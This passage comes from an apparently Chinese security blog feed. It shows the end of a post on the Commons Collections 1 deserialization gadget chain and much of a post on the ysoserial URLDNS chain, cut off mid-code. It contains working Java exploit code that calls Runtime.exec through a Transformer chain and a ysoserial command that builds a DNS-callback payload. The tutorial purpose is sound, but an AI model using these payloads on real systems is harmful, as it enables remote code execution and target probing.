利用构造函数实例化,创建与 lazyMap 关联的 InvocationHandler</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">lazyMapHandler</span> <span class="operator">=</span> (InvocationHandler) annoConstructor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化代理对象,proxyMap 调用的方法都会被转发 InvocationHandler#invoke 方法</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">            Map.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">            lazyMapHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 对 proxyMap 重新包裹</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">proxyMapHandler</span> <span class="operator">=</span> (InvocationHandler) annoConstructor.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Serialization</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(proxyMapHandler);</span><br><span class="line">        oos.close();</span><br><span class="line">        baos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Deserialization</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="反序列化触发"><a href="#反序列化触发" class="headerlink" title="反序列化触发"></a>反序列化触发</h2><p>这里在<code>AnnotationInvocationHandle#readObject()</code>中打下断点开始调试，此处的<code>this.memberValues</code>其实就是<code>LazyMap</code>，而前面用<code>AnnotationInvocationHandler</code>对<code>LazyMap</code>对象进行代理。也就是说只要调用任意方法，就会进入到<code>AnnotationInvocationHandler#invoke()</code>方法中</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-13.png" data-caption="Java安全漫谈-CC1篇-7"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-13.png" alt="Java安全漫谈-CC1篇-7"></a></p><p>在<code>AnnotationInvocationHandler#invoke()</code>方法中的这行打个断点，因为此处<code>this.memberValues</code>触发了<code>get()</code>方法，那么就会触发所代理的<code>LazyMap#get()</code></p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-14.png" data-caption="Java安全漫谈-CC1篇-7"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-14.png" alt="Java安全漫谈-CC1篇-7"></a></p><p>可以跟进看看，确实跳转到了<code>LazyMap#get()</code>。这里当<code>key</code>不在这个 Map 对象中，则会调用<code>transform()</code>，从而完成触发恶意代码</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-15.png" data-caption="Java安全漫谈-CC1篇-7"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-15.png" alt="Java安全漫谈-CC1篇-7"></a></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>发现 ysoserial 中的<code>Transformer[]</code>数组最后增加了一个<code>ConstantTransformer(1)</code>，目的是为了清除报错信息</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-f2rnuplr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-f2rnuplr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;open -a Calculator&quot;</span> &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全漫谈-URLDNS篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><blockquote><p>这是反序列化系列的第一篇文章，所以先简单介绍下环境搭建以及如何调试</p></blockquote><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><blockquote><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a>是一款用于生成反序列化数据的工具。攻击者可以选择利用链和输入自定义命令，然后通过该工具生成对应的反序列化利用数据，然后将生成的数据发送给存在漏洞的目标，从而执行命令。</p></blockquote><ul><li>安装多个不同版本 JDK，因为有些利用链有版本限制，这里是<code>8u291</code>和<code>8u66</code></li><li>下载 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 源码到本地，该工具包含了所需要的依赖库，只需要 Maven 导入即可；<ul><li>如果依赖有问题，可以手工点击菜单里的<code>Files - Project Structure</code>配置<code>Libraries</code></li></ul></li><li>将<code>src/test/java/</code>目录下的文件全部删除，后续在这个目录下编写的测试类；最后将 <a href="https://github.com/frohoff/ysoserial/releases/">ysoserial-all.jar</a> 下载到本地，便于生成序列化数据进行测试。</li></ul><p>最终主要目录结构如下：<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-0.png" data-caption="Java安全漫谈-URLDNS篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-0.png" alt="Java安全漫谈-URLDNS篇-0"></a></p><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><blockquote><p>Gadget 就是利用链，也叫 Gadget Chains，它连接的是<strong>从触发位置开始到执行命令的位置结束</strong>。</p></blockquote><p>ysoserial 中存在着很多条 Gadget，而使用 Gadget 时都会调用其中的<code>getObject()</code>方法，该方法会返回一个对象，最后将该对象进行序列化；如果目标存在反序列化漏洞，并满足这个 Gadget 对应的条件。那么在将这个 Gadget 所对应生成的序列化对象发送给目标时，目标会对其进行反序列化，最终导致序列化对象中的恶意命令被执行。<br>运行 <a href="https://github.com/frohoff/ysoserial/releases/">ysoserial-all.jar</a> 工具简单生成了一条 URLDNS 的 POC：</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-105y73lr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-105y73lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-all.jar URLDNS <span class="string">&quot;http://xxx.dnslog.cn&quot;</span> &gt; dnslog.ser</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="参数配置"><a href="#参数配置" class="headerlink" title="参数配置"></a>参数配置</h3><p>在<code>pom.xml</code>文件中找到入口文件，也就是<code>GeneratePayload.java</code></p><figure class="highlight xml"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-uqi6l2lr592jbb"></i><span>  Xml  </span><div class="collapse show" id="collapse-uqi6l2lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>ysoserial.GeneratePayload<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></div></figure><p>在<code>GeneratePayload.java</code>的<code>main</code>函数处添加断点，然后右上角修改配置，添加所需参数，最后点击调试<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-1.png" data-caption="Java安全漫谈-URLDNS篇-1"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-1.png" alt="Java安全漫谈-URLDNS篇-1"></a></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>利用链：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-7oi0yalr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-7oi0yalr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br></pre></td></tr></table></div></figure><h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><blockquote><p>这部分会先获取所调用的 Gadget 的类对象，这里是 URLDNS 的类对象，后续其他 Gadget 也是同理</p></blockquote><p>首先 ysoserial 接收到参数并分别赋值，接着跟进<code>Utils.getPayloadClass(&quot;URLDNS&quot;)</code>方法</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-xoi8ralr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-xoi8ralr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];  <span class="comment">// URLDNS</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];      <span class="comment">// &lt;DNGLog平台地址&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-2.png" data-caption="Java安全漫谈-URLDNS篇-2"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-2.png" alt="Java安全漫谈-URLDNS篇-2"></a><br>在<code>getPayloadClass()</code>方法中，通过反射获取到传入的<code>URLDNS</code>的 Class 对象并返回</p><ul><li>这里一开始的<code>Class.forName(&quot;URLDNS&quot;)</code>并没有找到对应的类对象，所以<code>clazz == null</code></li><li>进入<code>if</code>语句后，通过拼接完整类名<code>ysoserial.payloads.URLDNS</code>后才获取到类对象</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-3.png" data-caption="Java安全漫谈-URLDNS篇-3"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-3.png" alt="Java安全漫谈-URLDNS篇-3"></a></p><h3 id="构造恶意序列化对象"><a href="#构造恶意序列化对象" class="headerlink" title="构造恶意序列化对象"></a>构造恶意序列化对象</h3><blockquote><p>这条 URLDNS 链的重点就是如何构造一个恶意的 HashMap 序列化对象并返回</p></blockquote><p><code>URLDNS</code>的 Class 对象返回后将赋值给<code>payloadClass</code>，然后执行<code>newInstance()</code>方法创建实例，并调用该实例的<code>getObject()</code>方法，并将 DNSLog 平台地址作为参数传入<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-4.png" data-caption="Java安全漫谈-URLDNS篇-4"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-4.png" alt="Java安全漫谈-URLDNS篇-4"></a><br>跟进<code>payload.getObject()</code>看看：</p><ul><li>创建<code>HashMap</code>对象和<code>URL</code>对象</li><li>调用<code>HashMap</code>对象的<code>put</code>方法，键为 URL 对象，值为传入的参数，即 DNSLog 平台地址</li><li>最后通过反射设置<code>URL</code>对象的<code>hashCode</code>设为<code>-1</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-5.png" data-caption="Java安全漫谈-URLDNS篇-5"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-5.png" alt="Java安全漫谈-URLDNS篇-5"></a></p><blockquote><p>为什么要通过反射将 URL 对象的<code>hashCode</code>的值为<code>-1</code>？原因已经在<code>URLDNS</code>的注释中：<br>During the put above, the URL’s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.<br>设置这个 URL 对象的<code>hashCode</code>为初始值<code>-1</code>，这样反序列化时将会重新计算其<code>hashCode</code>，才能触发到后⾯的 DNS 请求，否则不会调⽤<code>URL#hashCode()</code></p></blockquote><p>最后将<code>HashMap</code>对象进行序列化并返回</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-uzlfp9lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-uzlfp9lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"><span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">Serializer.serialize(object, out);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="反序列化触发"><a href="#反序列化触发" class="headerlink" title="反序列化触发"></a>反序列化触发</h2><blockquote><p>触发反序列化的⽅法是<code>readObject()</code> ，因为 Java 开发者经常会在某些类中重写该方法，导致可以构造利⽤链。</p></blockquote><p>在 URLDNS 利用链中，ysoserial 先获取到了 URLDNS 的类对象，然后调用了该类对象<code>newInstance()</code>方法创建实例，然后调用该实例的<code>getObject()</code>方法获取到一个序列化后的<code>HashMap</code>对象。<br>因此在将这段序列化数据发送给目标，目标对其进行反序列化时，会触发<code>HashMap</code>对象的<code>readObject()</code>方法。所以可以直接看<code>HashMap</code>类的<code>readObject()</code>方法：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ue4aw1lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-ue4aw1lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">  <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">  <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">  s.defaultReadObject();</span><br><span class="line">  reinitialize();</span><br><span class="line">  <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                     loadFactor);</span><br><span class="line">  s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">  <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">  <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                     mappings);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">    <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">    <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">    <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">               DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">               (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">               MAXIMUM_CAPACITY :</span><br><span class="line">               tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">    <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">    threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                 (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">    <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">    <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">      Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">    table = tab;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">      <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">      <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">      putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>在<code>HashMap</code>类中的第<code>41</code>行<code>putVal(hash(key), key, value, false, false);</code>处打下断点</p><blockquote><p>在没有分析过的情况下，为何关注 hash 函数？<br>因为 ysoserial 的注释中很明确地说明了“During the put above, the URL’s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.”，是指 hashCode 的计算操作触发了DNS请求。</p></blockquote><p>创建一个简单的<code>TestDNS.java</code>文件并调试，程序将从<code>ois.readObject()</code>进入到<code>HashMap</code>类的断点</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-61bji0lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-61bji0lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serfile</span> <span class="operator">=</span> <span class="string">&quot;src/test/java/dnslog.ser&quot;</span>;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(serfile));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>接着调用了<code>HashMap#putVal()</code>方法，该方法中调用了另一个方法<code>hash(key)</code>，跟进发现<code>HashMap#hash()</code>方法调用了<code>key.hashCode()</code>，即计算<code>key</code>的 Hash 值；<br>跟进跳转到<code>URL#hashCode()</code>方法，这里当<code>hashCode!=-1</code>时会直接返回。而如果<code>hashCode==-1</code>，就会执行下面的<code>handler.hashCode()</code>；</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-a5voyolr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-a5voyolr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>再次跟进，跳转到<code>URLStreamHandler#hashCode()</code>，该方法中调用了<code>URLStreamHandler#getHostAddress()</code>方法；<br>依次跟进到<code>URL#getHostAddress()</code>方法，这里调用了<code>InetAddress.getByName(host)</code>，该方法会根据主机名获取 IP 地址，即进行一次 DNS 查询，触发 DNSLog 记录</p><p>完整调用栈如下：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-9hr56dlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-9hr56dlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()</span><br><span class="line">  HashMap#hash()</span><br><span class="line">    URL#hashCode()</span><br><span class="line">      URLStreamHandler#hashCode()</span><br><span class="line">        URLStreamHandler#getHostAddress()</span><br><span class="line">          URL#getHostAddress()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-6.png" data-caption="Java安全漫谈-URLDNS篇-6"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-URLDNS%E7%AF%87-6.png" alt="Java安全漫谈-URLDNS篇-6"></a></p><p>总的来说，这条链的触发原因是<code>HashMap</code>重写了<code>readObject()</code>方法，该方法中会触发<code>putVal(hash(key), key, value, false, false);</code>；跟进<code>hash(key)</code>发现存在<code>key.hashCode()</code>，即计算<code>key</code>的哈希值；<br>因为前面把<code>URL</code>对象当成<code>key</code>存进了<code>HashMap</code>，所以这里会触发<code>URL</code>对象的<code>hashCode()</code>方法；在<code>URL#hashCode()</code>中，当<code>hashCode==-1</code>时会触发<code>URLStreamHandler#hashCode()</code>，进行到后⾯的 <code>getHostAddress()</code>方法查询主机地址时，会触发 DNS 请求。</p><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>根据前面的调用栈：</p><ul><li>首先需要一个<code>HashMap</code>和<code>URL</code>实例</li><li>设置<code>URL</code>实例的<code>hashCode</code>值为<code>-1</code></li><li>将<code>hashMap</code>对象进行序列化</li><li>反序列化触发漏洞</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ixx0aclr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-ixx0aclr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> 